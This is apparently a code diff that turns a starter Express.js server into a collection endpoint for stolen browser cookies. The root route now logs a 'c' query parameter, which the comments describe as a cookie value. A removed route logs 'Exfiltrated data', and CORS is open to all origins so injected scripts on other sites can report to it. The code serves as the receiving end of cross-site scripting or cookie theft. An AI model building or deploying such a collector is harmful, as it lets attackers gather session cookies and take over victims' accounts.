@@ -2,27 +2,31 @@ const express = require('express');
 const cors = require('cors');
 const app = express();
 
-// CORS is required so browsers don't block your fetch requests
+// Middleware: CORS & Body Parser
 app.use(cors());
 app.use(express.json());
 
-// This handles requests to https://your-server.com/
+// Main Root Route (Consolidated)
 app.get('/', (req, res) => {
-  res.json({ message: "Hello! Your server is working." });
+  // Logs the full query object (e.g. { c: 'cookie_value' })
+  console.log('Incoming Query Parameters:', req.query);
+
+  // Safely check if 'c' exists specifically
+  if (req.query.c) {
+    console.log('Captured "c" parameter:', req.query.c);
+  }
+
+  // Always return a response so the browser doesn't hang
+  res.send('OK');
 });
 
-// Example of an extra endpoint: https://your-server.com/data
+// Extra Endpoint
 app.get('/data', (req, res) => {
   res.json({ status: "success", items: [1, 2, 3] });
 });
 
+// Start the Server (Keep at the bottom)
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
-
-app.get('/', (req, res) => {
-    console.log('Exfiltrated data:', req.query);
-    // Store to database or file
-    res.send('OK'); // Send response to complete the request
+  console.log(`Server running on port ${PORT}`);
 });
